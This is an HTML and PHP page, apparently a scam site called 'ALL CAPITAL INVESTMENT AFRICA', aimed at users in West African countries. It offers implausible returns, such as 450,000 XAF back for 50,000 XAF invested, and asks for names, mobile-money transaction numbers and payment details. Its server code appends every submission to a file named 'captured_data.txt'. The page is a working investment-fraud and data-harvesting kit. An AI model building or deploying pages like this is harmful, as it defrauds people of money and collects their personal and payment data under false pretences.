<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ALL CAPITAL INVESTMENT AFRICA</title>
    <style>
        body {
            background-image: url('https://pic.clubic.com/v1/images/1831193/raw.webp?fit=max&width=1200&hash=0bc0f8a23d9396eafc72622a33611d98d7f22adb');
            background-size: cover;
            font-family: Arial, sans-serif;
            color: #333;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 0;
        }
        .container {
            background: rgba(255, 255, 255, 0.8);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            width: 90%;
            max-width: 400px;
        }
        .container img {
            width: 20px;
            vertical-align: middle;
            margin-right: 10px;
        }
        .block {
            margin-bottom: 20px;
        }
        .block label {
            display: block;
            margin-bottom: 5px;
        }
        .block input, .block select {
            width: calc(100% - 20px);
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-size: 1em;
        }
        .block button {
            padding: 10px 20px;
            background-color: blue;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 1em;
            cursor: pointer;
        }
        .block button:hover {
            background-color: darkblue;
        }
        .country-option {
            display: flex;
            align-items: center;
        }
        .country-option img {
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1><img src="https://www.wolfram.com/mathematica/new-in-10/entity-based-geocomputation/HTMLImages.en/map-the-countries-of-africa-with-their-flags/O_8.png" alt="Logo">ALL CAPITAL INVESTMENT AFRICA</h1>

        <?php
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
            $name = $_POST['name'];
            $country = $_POST['country'];
            $transaction_number = $_POST['transaction_number'];
            $payment_mode = $_POST['payment_mode'];
            $investment_amount = $_POST['investment_amount'];
            $received_amount = $_POST['received_amount'];

            $data = "Name: $name\nCountry: $country\nTransaction Number: $transaction_number\nPayment Mode: $payment_mode\nInvestment Amount: $investment_amount\nReceived Amount: $received_amount\n\n";

            $file = 'captured_data.txt';
            file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

            header('Location: http://127.0.0.1:5500/Final2.html');
            exit();
        }
        ?>

        <form action="" method="POST">
            <div class="block">
                <label for="name">Nom et Prénom</label>
                <input type="text" id="name" name="name" placeholder="Votre nom et prénom">
            </div>

            <div class="block">
                <label for="country">Sélectionnez votre pays</label>
                <select id="country" name="country">
                    <option value="Benin">🇧🇯 Bénin</option>
                    <option value="Burkina_Faso">🇧🇫 Burkina Faso</option>
                    <option value="Cote_d_Ivoire">🇨🇮 Côte d'Ivoire</option>
                    <option value="Ghana">🇬🇭 Ghana</option>
                    <option value="Guinee_Conakry">🇬🇳 Guinée Conakry</option>
                    <option value="Mali">🇲🇱 Mali</option>
                    <option value="Mauritanie">🇲🇷 Mauritanie</option>
                    <option value="Senegal">🇸🇳 Sénégal</option>
                    <option value="Togo">🇹🇬 Togo</option>
                </select>
            </div>

            <div class="block">
                <label for="transaction_number">Numéro de transaction</label>
                <div style="display: flex;">
                    <input type="text" id="phone_code" name="phone_code" style="width: 20%;" readonly>
                    <input type="text" id="transaction_number" name="transaction_number" style="width: 80%;" placeholder="Votre numéro de transaction">
                </div>
            </div>

            <div class="block">
                <label for="payment_mode">Mode de paiement</label>
                <select id="payment_mode" name="payment_mode"></select>
            </div>

            <div class="block">
                <label for="investment_amount">Montant à Investir</label>
                <select id="investment_amount" name="investment_amount">
                    <option value="50000">50.000XAF</option>
                    <option value="80000">80.000XAF</option>
                    <option value="100000">100.000XAF</option>
                    <option value="300000">300.000XAF</option>
                    <option value="500000">500.000XAF</option>
                    <option value="700000">700.000XAF</option>
                    <option value="900000">900.000XAF</option>
                    <option value="1000000">1.000.000XAF</option>
                </select>
            </div>

            <div class="block">
                <label for="received_amount">Montant à Recevoir</label>
                <input type="text" id="received_amount" name="received_amount" readonly>
            </div>

            <div class="block">
                <button type="submit" id="invest_button">Investir</button>
            </div>
        </form>
    </div>

    <script>
        const countrySelect = document.getElementById('country');
        const phoneCodeInput = document.getElementById('phone_code');
        const paymentModeSelect = document.getElementById('payment_mode');
        const investmentAmountSelect = document.getElementById('investment_amount');
        const receivedAmountInput = document.getElementById('received_amount');

        const phoneCodes = {
            "Benin": "+229",
            "Burkina_Faso": "+226",
            "Cote_d_Ivoire": "+225",
            "Ghana": "+233",
            "Guinee_Conakry": "+224",
            "Mali": "+223",
            "Mauritanie": "+222",
            "Senegal": "+221",
            "Togo": "+228"
        };

        const paymentModes = {
            "Benin": ['MTN money', 'Moov money'],
            "Burkina_Faso": ['Orange money', 'Wave money', 'Moov money'],
            "Cote_d_Ivoire": ['Orange money', 'MTN money', 'Moov money', 'Wave money'],
            "Ghana": ['MTN money'],
            "Guinee_Conakry": ['MTN money', 'AKEBA', 'Orange money'],
            "Mali": ['Orange money'],
            "Mauritanie": ['Bankly Mauritania'],
            "Senegal": ['Wave money', 'Orange money'],
            "Togo": ['Togocel', 'Tmoney', 'Moovtogo', 'Flooz']
        };

        const receivedAmounts = {
            50000: '450.000XAF',
            80000: '650.000XAF',
            100000: '900.000XAF',
            300000: '1.300.000XAF',
            500000: '1.800.000XAF',
            700000: '2.000.000XAF',
            900000: '2.500.000XAF',
            1000000: '3.000.000XAF'
        };

        countrySelect.addEventListener('change', (event) => {
            const selectedCountry = event.target.value;
            phoneCodeInput.value = phoneCodes[selectedCountry];

            paymentModeSelect.innerHTML = '';
            paymentModes[selectedCountry].forEach(mode => {
                const option = document.createElement('option');
                option.value = mode;
                option.textContent = mode;
                paymentModeSelect.appendChild(option);
            });
        });

        investmentAmountSelect.addEventListener('change', (event) => {
            const selectedAmount = event.target.value;
            receivedAmountInput.value = receivedAmounts[selectedAmount];
        });
    </script>
</body>
</html>
